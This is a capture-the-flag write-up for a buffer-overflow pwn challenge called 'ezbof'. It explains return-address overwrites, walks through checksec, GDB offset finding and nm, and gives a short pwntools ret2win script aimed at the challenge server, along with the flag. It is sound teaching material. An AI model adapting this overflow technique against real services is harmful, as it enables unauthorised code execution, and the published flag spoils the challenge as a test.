# ezbof — ImaginaryCTF Writeup

**Challenge:** ezbof  
**Category:** Pwn  
**Difficulty:** Medium  
**Points:** 100 pts  
**Flag:** `ictf{maybe_ezbof_is_not_so_easy_after_all}`

---

## Description

> yet another bof chall

**Connection:** `nc 40.233.104.177 1337`

---

## Background Knowledge (Read This First!)

### What is a Buffer Overflow (BOF)?

A **buffer overflow** happens when a program writes more data into a fixed-size memory buffer than it can hold. The extra bytes spill over into adjacent memory — including the **return address** of the current function.

By overwriting the return address, an attacker can redirect code execution anywhere — including a `win()` function that prints the flag.

### What tools do we use?

| Tool | What it does |
|------|-------------|
| `checksec` | Shows binary protections (NX, PIE, canary, RELRO) |
| `gdb` + `pwndbg` | Debugger for finding the exact overflow offset |
| `pwntools` | Python library for building and sending exploits |

### What is the offset?

The **offset** is how many bytes you need to fill the buffer before you reach the return address. Finding this exact number is the key step in any BOF challenge.

---

## Solution

### Step 1 — Download and check the binary

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ checksec ezbof
# → Look for: No stack canary, NX on/off, PIE on/off
```

### Step 2 — Find the overflow offset in GDB

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ gdb ./ezbof
(gdb) pattern create 200
(gdb) run
# → Paste the cyclic pattern as input when prompted
(gdb) pattern offset $rip
# → Offset = X bytes
```

### Step 3 — Find the win function address

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ nm ezbof | grep win
# → 0x0000000000401234 T win
```

### Step 4 — Create the exploit script

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ nano exploit.py
```

Paste this:

```python
from pwn import *

conn = remote('40.233.104.177', 1337)

offset   = 40            # replace with your found offset
win_addr = 0x401234      # replace with actual win() address

payload  = b'A' * offset
payload += p64(win_addr)

conn.sendline(payload)
conn.interactive()
```

### Step 5 — Run it and get the flag

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ python3 exploit.py
# → ictf{maybe_ezbof_is_not_so_easy_after_all}
```

*(The full detailed solve script is provided in the challenge attachments.)*

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| `checksec` | Identify binary protections | ⭐ Easy |
| `gdb` + `pwndbg` | Find the exact overflow offset | ⭐⭐ Medium |
| `pwntools` | Build and send the exploit payload | ⭐⭐ Medium |
| `nc` | Connect to the challenge server | ⭐ Easy |

---

## Key Takeaways

- Buffer overflows are one of the most common CTF pwn challenge types
- Always run `checksec` first to know what protections you are dealing with
- The key steps are always: **find offset → find target address → overwrite return address**
- `pwntools` makes writing exploits dramatically faster
